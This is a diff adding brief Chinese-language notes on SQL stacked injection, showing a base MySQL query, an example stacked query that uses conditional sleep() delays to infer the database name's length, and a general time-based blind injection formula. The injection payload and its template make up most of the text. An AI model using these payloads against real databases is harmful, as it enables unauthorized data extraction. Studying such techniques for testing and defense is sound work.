@@ -1,0 +1,6 @@
+查询语句为：select * from users where id=1
+
+堆叠注入：mysql> select * from users where id=1; select if((length(database())=8),sleep(1)
+,sleep(3));
+
+公式：if((注入语句),sleep(1),sleep(3))
